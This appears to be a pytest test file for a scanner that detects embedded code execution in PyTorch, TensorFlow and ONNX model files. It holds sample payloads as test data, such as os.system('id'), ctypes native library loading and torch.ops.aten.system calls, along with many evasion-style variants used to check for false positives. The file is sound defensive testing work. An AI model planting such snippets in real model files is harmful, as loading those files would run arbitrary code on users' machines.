            b"    return ctypes.LibraryLoader(SafeCDLL).payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("payload", "expected_pattern"),
        [
            (
                b"def payload():\n    import webbrowser as wb\n    return wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"def payload():\n    import ctypes as ct\n    return ct.CDLL('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_detects_late_priority_webbrowser_and_ctypes_aliases(
        self, payload: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = b"\x00\xff" + leading_blocks + payload

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "code_execution_pattern" and f.pattern == expected_pattern for f in findings)

    def test_scan_model_ignores_safe_webbrowser_get_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import webbrowser\n"
            b"    webbrowser.get = len\n"
            b"    return webbrowser.get([]).open('https://example.invalid')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_ignores_non_loading_ctypes_subclass_initializers(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class NoLoad(Safe, ctypes.CDLL):\n"
            b"        pass\n"
            b"    ctypes.LibraryLoader(NoLoad).payload\n"
            b"    NoLoad('/missing')\n"
            b"    class MissingNameSuperCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super().__init__()\n"
            b"    ctypes.LibraryLoader(MissingNameSuperCDLL).payload\n"
            b"    MissingNameSuperCDLL('/missing')\n"
            b"    class DeadDelegateCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            if False:\n"
            b"                ctypes.CDLL.__init__(self, name)\n"
            b"    ctypes.LibraryLoader(DeadDelegateCDLL).payload\n"
            b"    DeadDelegateCDLL('/missing')\n"
            b"    class InstanceShadowCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init = lambda name: None\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(InstanceShadowCDLL).payload\n"
            b"    InstanceShadowCDLL('/missing')\n"
            b"    class NewSkipsInitCDLL(ctypes.CDLL):\n"
            b"        def __new__(cls, name: str):\n"
            b"            return object()\n"
            b"    ctypes.LibraryLoader(NewSkipsInitCDLL).payload\n"
            b"    NewSkipsInitCDLL('/missing')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_safe_webbrowser_method_overwrite_and_invalid_libraryloader(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    browser.open = len\n"
            b"    browser.open([])\n"
            b"    loader = ctypes.LibraryLoader(len)\n"
            b"    loader.payload.printf(b'x')\n"
            b"    load = ctypes.cdll.LoadLibrary\n"
            b"    class_attr = ctypes.LibraryLoader.payload\n"
            b"    ctypes.windll.kernel32 = len\n"
            b"    getattr(ctypes.windll, 'kernel32')\n"
            b"    getattr(object=ctypes.cdll, name='msvcrt')\n"
            b"    ctypes.windll.kernel32\n"
            b"    ctypes.cdll.__getattribute__('msvcrt')\n"
            b"    object.__getattribute__(ctypes.cdll, 'msvcrt')\n"
            b"    os.__getattr__('system')('id')\n"
            b"    builtins.__getattr__('eval')('1')\n"
            b"    other = browser\n"
            b"    browser.open = len\n"
            b"    browser = webbrowser.get()\n"
            b"    other.open([])\n"
            b"    other_loader = loader\n"
            b"    loader.payload = len\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    other_loader.payload([])\n"
            b"    ctypes.LibraryLoader = len\n"
            b"    ctypes.LibraryLoader(ctypes.CDLL).payload\n"
            b"    class SafeCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            pass\n"
            b"    ctypes.LibraryLoader(SafeCDLL).payload\n"
            b"    SafeCDLL('/missing')\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class NoLoad(Safe, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super().__init__(name)\n"
            b"    ctypes.LibraryLoader(NoLoad).payload\n"
            b"    NoLoad('/missing')\n"
            b"    class OverwrittenInitCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def init(self, name: str) -> None:\n"
            b"            pass\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(OverwrittenInitCDLL).payload\n"
            b"    OverwrittenInitCDLL('/missing')\n"
            b"    class SafeNestedCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            def later() -> None:\n"
            b"                ctypes.CDLL.__init__(self, name)\n"
            b"    ctypes.LibraryLoader(SafeNestedCDLL).payload\n"
            b"    SafeNestedCDLL('/missing')\n"
            b"    class SafeShadowCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init = lambda name: None\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(SafeShadowCDLL).payload\n"
            b"    SafeShadowCDLL('/missing')\n"
            b"    class SafeNewCDLL(ctypes.CDLL):\n"
            b"        def __new__(cls, name: str):\n"
            b"            return object()\n"
            b"    ctypes.LibraryLoader(SafeNewCDLL).payload\n"
            b"    SafeNewCDLL('/missing')\n"
            b"    setattr(ctypes.windll, 'kernel32', len)\n"
            b"    ctypes.windll.kernel32\n"
            b"    safe_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    setattr(safe_loader, 'payload', len)\n"
            b"    safe_loader.payload([])\n"
            b"    safe_browser = webbrowser.get()\n"
            b"    setattr(safe_browser, 'open', len)\n"
            b"    safe_browser.open([])\n"
            b"    return load.__name__\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern"
            and finding.pattern in {"Web browser launch detected", "Native library loading detected"}
            for finding in findings
        )

    def test_strict_mode(self) -> None:
        """Test strict mode flags any JIT usage."""
        detector_normal = JITScriptDetector({"strict_mode": False})
        detector_strict = JITScriptDetector({"strict_mode": True})

        data = b"TorchScript torch.jit.script"

        findings_normal = detector_normal.scan_torchscript(data)
        findings_strict = detector_strict.scan_torchscript(data)

        assert not any(f.type == "jit_usage" for f in findings_normal)
        # Strict mode should flag JIT usage
        assert any(f.type == "jit_usage" for f in findings_strict)
        # Normal mode might not flag it as severely
        strict_warnings = [f for f in findings_strict if f.type == "jit_usage"]
        assert len(strict_warnings) > 0

    def test_custom_dangerous_ops(self):
        """Test adding custom dangerous operations."""
        config = {
            "custom_dangerous_ops": {
                "torch": ["my.custom.dangerous.op"],
                "tf": ["tf.my.dangerous.function"],
            }
        }
        detector = JITScriptDetector(config)

        # Test custom Torch op
        torch_data = b"my.custom.dangerous.op(payload)"
        findings = detector.scan_torchscript(torch_data)
        assert any("my.custom.dangerous.op" in getattr(f, "operation", "") for f in findings)

        # Test custom TF op
        tf_data = b"tf.my.dangerous.function(exploit)"
        findings = detector.scan_tensorflow(tf_data)
        assert any("tf.my.dangerous.function" in getattr(f, "operation", "") for f in findings)

    def test_ast_analysis(self):
        """Test Python AST analysis for dangerous patterns."""
        detector = JITScriptDetector()

        # Valid Python code with dangerous patterns
        python_code = b"""
def malicious():
    import os
    from subprocess import call

    eval('dangerous')
    exec(compile('code', 'string', 'exec'))
    __import__('sys').exit()
"""

        findings = detector._extract_and_check_python_code(python_code, "Test", "test")

        # Should detect through AST analysis
        ast_findings = [f for f in findings if "ast_" in getattr(f, "type", "")]
        assert len(ast_findings) > 0
        assert any("os" in getattr(f, "import_", "") for f in ast_findings)


class TestDetectJITScriptRisks:
    """Test the convenience function for file scanning."""

    def test_scan_file(self, tmp_path):
        """Test scanning a file for JIT/Script risks."""
        # Create a test file with dangerous content
        test_file = tmp_path / "model.pt"
        test_file.write_bytes(b"TorchScript\ntorch.ops.aten.system('evil')")

        findings = detect_jit_script_risks(str(test_file))
        assert len(findings) > 0
        assert any("torch.ops.aten.system" in str(f) for f in findings)

    def test_scan_file_detects_unmarked_dangerous_python_source(self, tmp_path: Path) -> None:
        test_file = tmp_path / "payload.bin"
        test_file.write_bytes(
            b"""
            def payload():
                import os
                return os.system("id")
            """
        )

        findings = detect_jit_script_risks(str(test_file))

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_file_not_found(self):
        """Test handling of non-existent files."""
        findings = detect_jit_script_risks("/non/existent/file.pt")
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "not found" in findings[0].message

    def test_file_too_large(self, tmp_path):
        """Test handling of files that are too large."""
        large_file = tmp_path / "large.pt"
        large_file.write_bytes(b"x" * 100)

        # Test with very small max_size
        findings = detect_jit_script_risks(str(large_file), max_size=50)
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "too large" in findings[0].message

    def test_model_type_detection_from_extension(self, tmp_path):
        """Test that model type is detected from file extension."""
        # Test PyTorch extensions
        for ext in [".pt", ".pth", ".pts", ".torchscript"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"torch.ops.aten.exec('bad')")
            findings = detect_jit_script_risks(str(test_file))
            assert any("torch.ops.aten.exec" in str(f) for f in findings)

        # Test TensorFlow extensions
        for ext in [".pb", ".h5", ".keras"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"tf.py_func(evil)")
            findings = detect_jit_script_risks(str(test_file))
            assert any("tf.py_func" in str(f) for f in findings)

        # Test ONNX extension
        test_file = tmp_path / "model.onnx"
        test_file.write_bytes(b"PythonOp custom")
        findings = detect_jit_script_risks(str(test_file))
        assert any("Python operator" in str(f) for f in findings)


def test_priority_assignment_aliases_bounds_expensive_probes(monkeypatch: pytest.MonkeyPatch) -> None:
    # Each indirect-alias probe re-parses the whole snippet; without a bound this is
    # quadratic in the assignment count (PR #1402 DoS follow-up). The expensive
    # probes are capped while the cheap direct-reference fast path still resolves.
    lines = ["import ctypes", *[f"v{index} = index + {index}" for index in range(400)], "alias = ctypes"]
    source = "\n".join(lines)
    tree = ast.parse(source)

    parse_calls = 0
    real_parse = ast.parse

    def counting_parse(*args: Any, **kwargs: Any) -> Any:
        nonlocal parse_calls
        parse_calls += 1
        return real_parse(*args, **kwargs)

    monkeypatch.setattr(jit_script_module.ast, "parse", counting_parse)
    aliases = jit_script_module._priority_assignment_aliases(source, tree, {"ctypes"})

    assert parse_calls <= jit_script_module._MAX_PRIORITY_ASSIGNMENT_PROBES + 1
    # The direct-reference alias is still discovered via the cheap fast path.
    assert b"alias" in aliases


def test_first_body_statement_segment_bounds_nested_recursion() -> None:
    # A pathologically nested run of ``:`` headers must not exhaust the stack
    # (PR #1402 recursion follow-up); extraction returns a bounded segment instead.
    header = b"def f():\n"
    candidate = header + b"".join(b" " * (depth + 1) + b"if 1:\n" for depth in range(3000)) + b" " * 3001 + b"x = 1\n"
    segment = jit_script_module._first_body_statement_segment(candidate, len(header), 0)
    assert segment is not None
